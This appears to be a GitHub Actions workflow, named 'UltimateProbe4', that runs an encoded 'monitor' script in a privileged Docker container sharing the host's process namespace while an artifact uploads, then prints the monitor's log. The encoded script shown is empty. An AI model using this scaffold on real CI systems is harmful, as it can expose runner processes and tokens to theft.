name: UltimateProbe4
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Start monitor
        run: |
          printf '%s' '' | base64 -d > /tmp/mon.sh
          chmod +x /tmp/mon.sh
          echo "probe" > /tmp/probe.txt
          nohup docker run --rm --privileged --pid=host -v /tmp/mon.sh:/mon.sh:ro ubuntu:24.04 bash /mon.sh > /tmp/mon.log 2>&1 &
          echo $! > /tmp/bgpid.txt
          sleep 5
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: probe-art
          path: /tmp/probe.txt
      - name: Read results
        run: |
          sleep 8
          kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
          echo "=RESULTS_START="
          cat /tmp/mon.log 2>/dev/null || echo "no log"
          echo "=RESULTS_END="
